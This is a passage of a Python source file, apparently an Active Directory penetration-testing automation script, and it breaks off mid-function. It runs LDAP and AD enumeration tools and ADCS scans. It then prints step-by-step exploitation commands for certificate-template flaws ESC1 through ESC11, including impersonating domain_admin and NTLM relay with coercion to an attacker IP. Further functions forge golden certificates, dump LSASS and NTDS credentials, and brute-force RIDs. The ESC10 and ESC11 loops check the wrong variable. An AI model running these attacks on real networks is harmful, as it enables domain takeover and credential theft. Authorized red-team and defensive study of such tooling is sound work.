    os.makedirs(os.path.join(output_dir, "DomainRecon", "Adalanche"), exist_ok=True)
    print(f"{BLUE}[*] Adalanche Enumeration{NC}")

    # Check if results directory is not empty
    if os.listdir(os.path.join(output_dir, "DomainRecon", "Adalanche", "data")):
        print(f"{YELLOW}[i] Adalanche results found, skipping... {NC}")
        return

    if aeskey_bool:
        print(f"{PURPLE}[-] Adalanche does not support Kerberos authentication using AES Key{NC}")
        return

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "DomainRecon", "Adalanche"))
    ldaps_param = "--tlsmode tls --ignorecert" if ldaps_bool else "--tlsmode NoTLS --port 389"
    run_command(f"{adalanche} {adalanche_verbose} collect activedirectory {argument_adalanche} --domain {dc_domain} --server {dc_ip} {ldaps_param}")
    os.chdir(current_dir)
    print("")

def GPOwned_enum():
    if not GPOwned:
        print(f"{RED}[-] Please verify the installation of GPOwned{NC}")
        return
    print(f"{BLUE}[*] GPO Enumeration using GPOwned{NC}")

    if nullsess_bool:
        print(f"{PURPLE}[-] GPOwned requires credentials{NC}")
        return

    ldaps_param = "-use-ldaps" if ldaps_bool else ""
    run_command(f"{python3} {GPOwned} {argument_GPOwned} {ldaps_param} -dc-ip {dc_ip} -listgpo -gpcuser")
    run_command(f"{python3} {GPOwned} {argument_GPOwned} {ldaps_param} -dc-ip {dc_ip} -listgpo -gpcmachine")
    print("")

def ldap_console():
    if not ldapconsole:
        print(f"{RED}[-] Please verify the installation of ldapconsole{NC}")
        return
    print(f"{BLUE}[*] Launching ldapconsole{NC}")

    if nullsess_bool:
        print(f"{PURPLE}[-] ldapconsole requires credentials {NC}")
        return

    ldaps_param = "--use-ldaps" if ldaps_bool else ""
    verbose_p0dalirius = "--debug" if verbose_bool else ""
    run_command(f"{python3} {ldapconsole} {argument_p0dalirius} {verbose_p0dalirius} {ldaps_param} --dc-ip {dc_ip} --kdcHost {dc_FQDN}")
    print("")

def ldap_monitor():
    if not pyLDAPmonitor:
        print(f"{RED}[-] Please verify the installation of pyLDAPmonitor{NC}")
        return
    print(f"{BLUE}[*] Launching pyLDAPmonitor{NC}")

    if nullsess_bool:
        print(f"{PURPLE}[-] pyLDAPmonitor requires credentials {NC}")
        return

    ldaps_param = "--use-ldaps" if ldaps_bool else ""
    verbose_p0dalirius = "--debug" if verbose_bool else ""
    run_command(f"{python3} {pyLDAPmonitor} {argument_p0dalirius} {verbose_p0dalirius} {ldaps_param} --dc-ip {dc_ip} --kdcHost {dc_FQDN}")
    print("")

def aced_console():
    if not aced:
        print(f"{RED}[-] Please verify the installation of aced{NC}")
        return

    if nullsess_bool:
        print(f"{PURPLE}[-] aced requires credentials{NC}")
        return

    print(f"{BLUE}[*] Launching aced{NC}")
    ldaps_param = "-ldaps" if ldaps_bool else ""
    run_command(f"{python3} {aced} {argument_aced}\\{dc_FQDN} {ldaps_param} -dc-ip {dc_ip}")
    print("")

def adpeas_enum():
    if not adPEAS:
        print(f"{RED}[-] Please verify the installation of adPEAS{NC}")
        return # changed to return, as there's no point to continue

    if nullsess_bool or kerb_bool or aeskey_bool or hash_bool:
        print(f"{PURPLE}[-] adPEAS only supports password authentication {NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "adPEAS"), exist_ok=True)
    print(f"{BLUE}[*] Launching adPEAS{NC}")
    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "DomainRecon", "adPEAS"))
    run_command(f"{adPEAS} {argument_adpeas} -i {dc_ip}")
    os.chdir(current_dir)
    print("")

def breads_console():
    if not breads:
        print(f"{RED}[-] Please verify the installation of breads{NC}")
        return
    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] breads does not support Kerberos authentication {NC}")
        return

    print(f"{BLUE}[*] Launching breads{NC}")
    # Clean up any existing profile
    subprocess.run(f"rm -rf $HOME/.breads/{user}_{dc_domain}", shell=True, executable='/bin/bash', check=False)

    # Construct the initial commands for breads
    initial_commands = f"create_profile {user}_{dc_domain}\nload_profile {user}_{dc_domain}\n{dc_ip}\n{domain}\\{user}\n{password}{hash}\ncurrent_profile"
    command = f"""(
        echo -e "{initial_commands}"
        cat /dev/tty
    ) | /usr/bin/script -qc "{breads}" /dev/null"""

    # Log the command execution (using the original logging logic)
    with open(command_log, "a") as log_file:
        log_file.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}; {breads} | tee -a {output_dir}/DomainRecon/breads_output_{dc_domain}.txt\n")
    run_command(command)

    print("")

def godap_console():
    if not godap:
        print(f"{RED}[-] Please verify the installation of godap{NC}")
        return # changed to return, as there's no point to continue

    if aeskey_bool:
        print(f"{PURPLE}[-] godap does not support Kerberos authentication using AES Key{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Launching godap{NC}")
    ldaps_param = "-S -I" if ldaps_bool else ""
    run_command(f"{godap} {target} {argument_godap} --kdc {dc_FQDN} {ldaps_param}")
    print("")

def ldapper_console():
    if not ldapper:
        print(f"{RED}[-] Please verify the installation of ldapper{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "LDAPPER"), exist_ok=True)

    if nullsess_bool or kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Running ldapper with custom LDAP search string{NC}")
    ldaps_param = "-n 1" if ldaps_bool else "-n 2"
    print(f"{CYAN}[*] Please choose an option or provide a custom LDAP search string {NC}")
    print("1.1) Get specific user (You will be prompted for the username)")
    print("2.1) Get specific group (You will be prompted for the group name)")
    print("4.1) Get specific computer (You will be prompted for the computer name)")
    print("9.1) Search for specific User SPN (You will be prompted for the User Principle Name)")
    print("10.1) Search for specific Workstation LAPS Password (You will be prompted for the Workstation Name)")
    print("*) Run custom Query (e.g. (&(objectcategory=user)(serviceprincipalname=*))")
    print("back) Go back")

    custom_option = input("> ")
    if custom_option != "back":
        run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -s {custom_option}")
        ldapper_console() # Recursive call to keep the console open
    else:
        ad_menu()
    print("")

def adcheck_enum():
    if not ADCheck:
        print(f"{RED}[-] Please verify the installation of ADCheck{NC}")
        return # changed to return, as there's no point to continue
    os.makedirs(os.path.join(output_dir, "DomainRecon", "ADCheck"), exist_ok=True)
    print(f"{BLUE}[*] ADCheck Enumeration{NC}")

    if nullsess_bool or kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] ADCheck requires credentials and does not support Kerberos authentication{NC}")
        return # changed to return, as there's no point to continue

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "DomainRecon", "ADCheck"))
    ldaps_param = "-s" if ldaps_bool else ""
    run_command(f"{ADCheck} {argument_adcheck} {ldaps_param} --dc-ip {dc_ip}")
    os.chdir(current_dir)

    # jq parsing commands
    subprocess.run(f'jq -r ".data[].Properties.samaccountname| select( . != null )" "{output_dir}"/DomainRecon/ADCheck/*_users.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_adcheck_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    subprocess.run(f'jq -r ".data[].Properties.name| select( . != null )" "{output_dir}"/DomainRecon/ADCheck/*_computers.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Servers/servers_list_adcheck_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)

    process = subprocess.run(f'jq -r \'.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]\' "{output_dir}"/DomainRecon/ADCheck/*_users.json', shell=True,
                   capture_output=True, text=True, stderr=subprocess.DEVNULL)
    if process.returncode == 0:
        with open(f"{output_dir}/DomainRecon/Servers/sql_list_adcheck_{dc_domain}.txt", "w") as f:
            for line in process.stdout.splitlines():
                try:
                    hostname = line.split("/")[1].split(":")[0]
                    f.write(hostname + "\n")  # Only write the hostname part
                except IndexError:
                    pass  # In case the line doesn't match the expected format
    parse_users()
    parse_servers()
    print("")

def soapy_enum():
    if not soapy:
        print(f"{RED}[-] Please verify the installation of soapy{NC}")
        return  # Exit if soapy is not installed

    os.makedirs(os.path.join(output_dir, "DomainRecon", "soapy"), exist_ok=True)
    print(f"{BLUE}[*] soapy Enumeration{NC}")

    if nullsess_bool or kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] soapy requires credentials and does not support Kerberos authentication{NC}")
        return

    os.chdir(os.path.join(output_dir, "DomainRecon", "soapy"))
    run_command(f"{soapy} --ts --users {argument_soapy}@{dc_ip}")
    run_command(f"{soapy} --ts --computers {argument_soapy}@{dc_ip}")
    run_command(f"{soapy} --ts --groups {argument_soapy}@{dc_ip}")
    run_command(f"{soapy} --ts --constrained {argument_soapy}@{dc_ip}")
    run_command(f"{soapy} --ts --unconstrained {argument_soapy}@{dc_ip}")
    run_command(f"{soapy} --ts --spns {argument_soapy}@{dc_ip}")
    run_command(f"{soapy} --ts --asreproastable {argument_soapy}@{dc_ip}")
    run_command(f"{soapy} --ts --admins {argument_soapy}@{dc_ip}")
    run_command(f"{soapy} --ts --rbcds {argument_soapy}@{dc_ip}")
    print("")

###### adcs_enum: ADCS Enumeration
def ne_adcs_enum():
    """
    Performs ADCS enumeration using netexec.
    Sets global variables pki_servers and pki_cas with the results.
    """
    global pki_servers, pki_cas  # Make sure we're modifying the global variables
    os.makedirs(os.path.join(output_dir, "ADCS"), exist_ok=True)
    if not os.path.isfile(f"{output_dir}/ADCS/ne_adcs_output_{dc_domain}.txt"):
        print(f"{BLUE}[*] ADCS Enumeration{NC}")
        ldaps_param = "--port 636" if ldaps_bool else ""
        run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} -M adcs --kdcHost {dc_FQDN}")
    else:
        print(f"{YELLOW}[i] ADCS info found, skipping...{NC}")

    # Extract and process the output
    with open(f"{output_dir}/ADCS/ne_adcs_output_{dc_domain}.txt", "r") as f:
        output = f.read()

    pki_servers = []
    pki_cas = []

    for line in output.splitlines():
        if "Found PKI Enrollment Server" in line:
            server = " ".join(line.split(" ")[4:])  # Join all parts after "Found PKI Enrollment Server"
            pki_servers.append(server)
        if "Found CN" in line:
            ca = " ".join(line.split(" ")[2:]).replace(" ", "SPACE")  # Join from "Found CN" and replace spaces
            pki_cas.append(ca)

    # Remove duplicates using list comprehension and checking for membership in a temporary list
    temp_list = []
    pki_servers = [x for x in pki_servers if x not in temp_list and not temp_list.append(x)]
    temp_list = []  # Reset for the next list
    pki_cas = [x for x in pki_cas if x not in temp_list and not temp_list.append(x)]

def certi_py_enum():
    if not certi_py:
        print(f"{RED}[-] Please verify the installation of certi.py{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] certi.py Enumeration{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] certi.py requires credentials{NC}")
        return  # Skip if null session

    run_command(f"{certi_py} list {argument_certi_py} --dc-ip {dc_ip} --class ca")
    run_command(f"{certi_py} list {argument_certi_py} --dc-ip {dc_ip} --class service")
    run_command(f"{certi_py} list {argument_certi_py} --dc-ip {dc_ip} --vuln --enabled")
    print("")

def certipy_enum():
    if not certipy:
        print(f"{RED}[-] Please verify the installation of certipy{NC}")
        return

    print(f"{BLUE}[*] Certipy Enumeration{NC}")

    # Check if results already exist
    if any(f.startswith(f"{dc_domain}_Certipy") for f in os.listdir(os.path.join(output_dir, "ADCS"))):
        print(f"{YELLOW}[i] Certipy results found, skipping... {NC}")
        adcs_vuln_parse() #Run even if we found files
        print("")
        return

    if nullsess_bool:
        print(f"{PURPLE}[-] certipy requires credentials{NC}")
        return

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "ADCS"))
    ldapbinding_param = "-ldap-channel-binding" if ldapbinding_bool else ""
    ldaps_param = f"-scheme ldaps {ldapbinding_param}" if ldaps_bool else "-scheme ldap"

    run_command(f"{certipy} find {argument_certipy} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp {ldaps_param} -stdout -old-bloodhound")
    run_command(f"{certipy} find {argument_certipy} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp {ldaps_param} -vulnerable -json -output vuln_{dc_domain} -stdout -hide-admins")
    os.chdir(current_dir)
    adcs_vuln_parse()
    print("")

def adcs_vuln_parse():
    ne_adcs_enum()
    esc1_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc1_vuln):
        print(f"{GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:{NC}")
        for vulntemp in esc1_vuln:
            if not vulntemp: continue #Jump empty lines
            print(f"{YELLOW}# {vulntemp} certificate template{NC}")
            print(f"{CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):{NC}")
            print(f"{certipy} req {argument_certipy} -ca '{pki_cas[0].replace('SPACE', ' ')}' -target '{pki_servers[0]}' -template {vulntemp} -upn domain_admin@{dc_domain} -dns {dc_FQDN} -dc-ip {dc_ip} -key-size 4096")
            print(f"{CYAN}2. Authenticate using pfx of domain_admin or DC:{NC}")
            print(f"{certipy} auth -pfx domain_admin_dc.pfx -dc-ip {dc_ip}")

    esc2_3_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Templates"[] | select ((."[!] Vulnerabilities"."ESC2" or ."[!] Vulnerabilities"."ESC3") and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc2_3_vuln):
        print(f"{GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:{NC}")
        for vulntemp in esc2_3_vuln:
            if not vulntemp: continue #Jump empty lines
            print(f"{YELLOW}# {vulntemp} certificate template{NC}")
            print(f"{CYAN}1. Request a certificate based on the vulnerable template:{NC}")
            print(f"{certipy} req {argument_certipy} -ca '{pki_cas[0].replace('SPACE', ' ')}' -target '{pki_servers[0]}' -template {vulntemp} -dc-ip {dc_ip}")
            print(f"{CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:{NC}")
            print(f"{certipy} req {argument_certipy} -ca '{pki_cas[0].replace('SPACE', ' ')}' -target '{pki_servers[0]}' -template User -on-behalf-of {dc_domain.split('.')[0]}\\domain_admin -pfx '{user}.pfx' -dc-ip {dc_ip}")
            print(f"{CYAN}3. Authenticate using pfx of domain_admin:{NC}")
            print(f"{certipy} auth -pfx domain_admin.pfx -dc-ip {dc_ip}")

    esc4_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC4" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc4_vuln):
        print(f"{GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:{NC}")
        for vulntemp in esc4_vuln:
            if not vulntemp: continue #Jump empty lines
            print(f"{YELLOW}# {vulntemp} certificate template{NC}")
            print(f"{CYAN}1. Make the template vulnerable to ESC1:{NC}")
            print(f"{certipy} template {argument_certipy} -template {vulntemp} -save-old -dc-ip {dc_ip}")
            print(f"{CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):{NC}")
            print(f"{certipy} req {argument_certipy} -ca '{pki_cas[0].replace('SPACE', ' ')}' -target '{pki_servers[0]}' -template {vulntemp} -upn domain_admin@{dc_domain} -dns {dc_FQDN} -dc-ip {dc_ip}")
            print(f"{CYAN}3. Restore configuration of vulnerable template:{NC}")
            print(f"{certipy} template {argument_certipy} -template {vulntemp} -configuration {vulntemp}.json")
            print(f"{CYAN}4. Authenticate using pfx of domain_admin or DC:{NC}")
            print(f"{certipy} auth -pfx domain_admin_dc.pfx -dc-ip {dc_ip}")

    esc6_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc6_vuln):
        print(f"{GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:{NC}")
        for vulnca in esc6_vuln:
            if not vulnca: continue #Jump empty lines
            print(f"{YELLOW}# {vulnca} certificate authority{NC}")
            print(f"{CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):{NC}")
            print(f"{certipy} req {argument_certipy} -ca {vulnca} -target '{pki_servers[0]}' -template User -upn domain_admin@{dc_domain} -dc-ip {dc_ip}")
            print(f"{CYAN}2. Authenticate using pfx of domain_admin:{NC}")
            print(f"{certipy} auth -pfx domain_admin.pfx -dc-ip {dc_ip}")

    esc7_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc7_vuln):
        print(f"{GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:{NC}")
        for vulnca in esc7_vuln:
            if not vulnca: continue #Jump empty lines
            print(f"{YELLOW}# {vulnca} certificate authority{NC}")
            print(f"{CYAN}1. Add a new officer:{NC}")
            print(f"{certipy} ca {argument_certipy} -ca {vulnca} -add-officer '{user}' -dc-ip {dc_ip}")
            print(f"{CYAN}2. Enable SubCA certificate template:{NC}")
            print(f"{certipy} ca {argument_certipy} -ca {vulnca} -enable-template SubCA -dc-ip {dc_ip}")
            print(f"{CYAN}3. Save the private key and note down the request ID:{NC}")
            print(f"{certipy} req {argument_certipy} -ca {vulnca} -target '{pki_servers[0]}' -template SubCA -upn domain_admin@{dc_domain} -dc-ip {dc_ip}")
            print(f"{CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):{NC}")
            print(f"{certipy} ca {argument_certipy} -ca {vulnca} -issue-request <request_ID> -dc-ip {dc_ip}")
            print(f"{CYAN}5. Retrieve an issued certificate:{NC}")
            print(f"{certipy} req {argument_certipy} -ca {vulnca} -target '{pki_servers[0]}' -retrieve <request_ID> -dc-ip {dc_ip}")
            print(f"{CYAN}6. Authenticate using pfx of domain_admin:{NC}")
            print(f"{certipy} auth -pfx domain_admin.pfx -dc-ip {dc_ip}")

    esc8_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc8_vuln):
        print(f"{GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:{NC}")
        for vulnca in esc8_vuln:
            if not vulnca: continue #Jump empty lines
            print(f"{YELLOW}# {vulnca} certificate authority{NC}")
            print(f"{CYAN}1. Start the relay server:{NC}")
            print(f"{certipy} relay -target http://'{pki_servers[0]}' -ca {vulnca} -template DomainController ")
            print(f"{CYAN}2. Coerce Domain Controller:{NC}")
            print(f"{coercer} coerce {argument_coercer} -t {dc_ip} -l '{attacker_IP}' --dc-ip {dc_ip}")
            print(f"{CYAN}3. Authenticate using pfx of Domain Controller:{NC}")
            print(f"{certipy} auth -pfx {dc_NETBIOS}.pfx -dc-ip {dc_ip}")

    esc9_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC9" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc9_vuln):
        print(f"{GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:{NC}")
        for vulntemp in esc9_vuln:
            if not vulntemp: continue #Jump empty lines
            print(f"{YELLOW}# {vulntemp} certificate template{NC}")
            print(f"{CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):{NC}")
            print(f"{certipy} shadow auto {argument_certipy} -account <second_user> -dc-ip {dc_ip}")
            print(f"{CYAN}2. Change userPrincipalName of second_user to domain_admin:{NC}")
            print(f"{certipy} account update {argument_certipy} -user <second_user> -upn domain_admin@{dc_domain} -dc-ip {dc_ip}")
            print(f"{CYAN}3. Request vulnerable certificate as second_user:{NC}")
            print(f"{certipy} req -username <second_user>@{dc_domain} -hash <second_user_hash> -target '{pki_servers[0]}' -ca '{pki_cas[0].replace('SPACE', ' ')}' -template {vulntemp} -dc-ip {dc_ip}")
            print(f"{CYAN}4. Change second_user's UPN back:{NC}")
            print(f"{certipy} account update {argument_certipy} -user <second_user> -upn <second_user>@{dc_domain} -dc-ip {dc_ip}")
            print(f"{CYAN}5. Authenticate using pfx of domain_admin:{NC}")
            print(f"{certipy} auth -pfx domain_admin.pfx -dc-ip {dc_ip}")

    esc10_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc10_vuln):
        print(f"{GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:{NC}")
        for vulnca in esc10_vuln:
            if not vulntemp: continue #Jump empty lines
            print(f"{YELLOW}# {vulnca} certificate authority{NC}")
            print(f"{CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):{NC}")
            print(f"{certipy} shadow auto {argument_certipy} -account <second_user> -dc-ip {dc_ip}")
            print(f"{CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:{NC}")
            print(f"{certipy} account update {argument_certipy} -user <second_user> -upn domain_admin@{dc_domain} -dc-ip {dc_ip}")
            print(f"{certipy} account update {argument_certipy} -user <second_user> -upn {dc_NETBIOS}\$@{dc_domain} -dc-ip {dc_ip}")
            print(f"{CYAN}3. Request certificate permitting client authentication as second_user:{NC}")
            print(f"{certipy} req -username <second_user>@{dc_domain} -hash <second_user_hash> -ca {vulnca} -template User -dc-ip {dc_ip}")
            print(f"{CYAN}4. Change second_user's UPN back:{NC}")
            print(f"{certipy} account update {argument_certipy} -user <second_user> -upn <second_user>@{dc_domain} -dc-ip {dc_ip}")
            print(f"{CYAN}5. Authenticate using pfx of domain_admin or DC:{NC}")
            print(f"{certipy} auth -pfx domain_admin.pfx -dc-ip {dc_ip}")
            print(f"{certipy} auth -pfx {dc_NETBIOS}.pfx -dc-ip {dc_ip}")

    esc11_vuln = subprocess.getoutput(
        f"""jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "{output_dir}/ADCS/vuln_{dc_domain}_Certipy.json" 2>/dev/null | sort -u"""
    ).split('\n')
    if any(esc11_vuln):
        print(f"{GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:{NC}")
        for vulnca in esc11_vuln:
            if not vulntemp: continue #Jump empty lines
            print(f"{YELLOW}# {vulnca} certificate authority{NC}")
            print(f"{CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):{NC}")
            print(f"ntlmrelayx.py -t rpc://'{pki_servers[0]}' -rpc-mode ICPR -icpr-ca-name {vulnca} -smb2support")
            print("OR")
            print(f"{certipy} relay -target rpc://'{pki_servers[0]}' -ca {vulnca}")
            print(f"{CYAN}2. Coerce Domain Controller:{NC}")
            print(f"{coercer} coerce {argument_coercer} -t {dc_ip} -l {attacker_IP} --dc-ip $dc_ip")

def certifried_check():
    if not certipy:
        print(f"{RED}[-] Please verify the installation of certipy{NC}")
        return

    print(f"{BLUE}[*] Certifried Vulnerability Check{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] certipy requires credentials{NC}")
        return  # Skip if null session

    ne_adcs_enum()
    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "Credentials"))

    i = 0
    for pki_server in pki_servers:
        i += 1
        pki_ca = pki_cas[i-1].replace("SPACE", " ")
        ldapbinding_param = "-ldap-channel-binding" if ldapbinding_bool else ""
        output = run_command(f"{certipy} req {argument_certipy} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp {ldapbinding_param} -target {pki_server} -ca \"{pki_ca}\" -template User")

        if "Certificate object SID is" not in output and "error" not in output:
            print(f"{GREEN}[+] {pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:{NC}")
            print(f"{CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:{NC}")
            print(f"{certipy} account create {argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain")
            print(f"{CYAN}2. Obtain a certificate for the new computer:{NC}")
            print(f"{certipy} req -u NEW_COMPUTER_NAME\$@{dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"{pki_ca}\" -template Machine")
            print(f"{CYAN}3. Authenticate using pfx:{NC}")
            print(f"{certipy} auth -pfx {dc_NETBIOS}.pfx -username {dc_NETBIOS}\$ -dc-ip {dc_ip}")
            print(f"{CYAN}4. Delete the created computer:{NC}")
            print(f"{certipy} account delete {argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME ")

    os.chdir(current_dir)
    print("")

def certipy_ldapshell():
    if not certipy:
        print(f"{RED}[-] Please verify the installation of certipy{NC}")
        return

    if cert_bool:
        print(f"{BLUE}[*] Launching LDAP shell via Schannel using Certipy {NC}")
        ldaps_param = "" if ldaps_bool else "-ldap-scheme ldap"
        run_command(f"{certipy} auth -pfx {pfxcert} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp {ldaps_param} -ldap-shell")
    else:
        print(f"{PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy{NC}")
    print("")

def certipy_ca_dump():
    if not certipy:
        print(f"{RED}[-] Please verify the installation of certipy{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Certipy extract CAs and forge Golden Certificate{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] certipy requires credentials{NC}")
        return  # Skip if null session

    ne_adcs_enum()
    domain_DN = fqdn_to_ldap_dn(dc_domain)

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "Credentials"))
    ldaps_param = "" if ldaps_bool else "-scheme ldap"

    i = 0
    for pki_server in pki_servers:
        i += 1
        pki_ca = pki_cas[i-1].replace("SPACE", " ")
        run_command(f"{certipy} ca {argument_certipy} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp -target {pki_server} -backup")
        run_command(f"{certipy} forge -ca-pfx {output_dir}/Credentials/{pki_ca.replace(' ', '_')}.pfx -upn Administrator@{dc_domain} -subject CN=Administrator,CN=Users,{domain_DN} -out Administrator_{pki_ca.replace(' ', '_')}_{dc_domain}.pfx")
        if os.path.isfile(f"{output_dir}/Credentials/Administrator_{pki_ca.replace(' ', '_')}_{dc_domain}.pfx"):
            print(f"{GREEN}[+] Golden Certificate successfully generated!{NC}")
            print(f"{CYAN}Authenticate using pfx of Administrator:{NC}")
            print(f"{certipy} auth -pfx {output_dir}/Credentials/Administrator_{pki_ca.replace(' ', '_')}_{dc_domain}.pfx -dc-ip {dc_ip} [-ldap-shell]")
    os.chdir(current_dir)
    print("")

def masky_dump():
    print(f"{BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] LSASS dump requires credentials${NC}")
        return

    ne_adcs_enum()
    if not pki_servers or not pki_cas:
        print(f"{PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}")
        return

    smb_scan()
    servers_smb_list = smb_scan()

    for i, pki_server in enumerate(pki_servers):
        pki_ca = pki_cas[i].replace("SPACE", " ")
        for target_server in open(servers_smb_list):
            target_server = target_server.strip()
            print(f"{CYAN}[*] LSASS dump of {target_server} using masky (PKINIT)${NC}")
            run_command(f"{netexec} {ne_verbose} smb {target_server} {argument_ne} -M masky -o \"CA={pki_server}\\{pki_ca}\"")
    print("")

def certsync_ntds_dump():
    if not certsync:
        print(f"{RED}[-] Please verify the installation of certsync{NC}")
        return

    print(f"{BLUE}[*] Dumping NTDS using certsync{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] certsync requires credentials${NC}")
        return

    ldaps_param = "" if ldaps_bool else "-scheme ldap"
    run_command(f"{certsync} {argument_certsync} -dc-ip {dc_ip} -dns-tcp -ns {dc_ip} {ldaps_param} -kdcHost {dc_FQDN} -outputfile {output_dir}/Credentials/certsync_{dc_domain}.txt")
    print("")

###### bruteforce: Brute Force attacks
def ridbrute_attack():
    if nullsess_bool:
        print(f"{BLUE}[*] RID Brute Force (Null session)${NC}")
        run_command(f"{netexec} {ne_verbose} smb {target} {argument_ne} --rid-brute")
        run_command(f"{netexec} {ne_verbose} smb {target} -u Guest -p '' --rid-brute")
        run_command(f"{netexec} {ne_verbose} smb {target} -u {rand_user} -p '' --rid-brute")
        # Parsing user lists from the command output
        with open(f"{output_dir}/BruteForce/ne_rid_brute_{dc_domain}.txt", "r") as f:
          content = f.read()
          with open(f"{output_dir}/DomainRecon/Users/users_list_ridbrute_{dc_domain}.txt", "w") as outfile:
            for line in content.splitlines():
                if "SidTypeUser" in line:
                    try:
                        username = line.split("\\")[1].split(" (")[0]
                        outfile.write(username + "\n")
                    except:
                        pass
        parse_users()
    else:
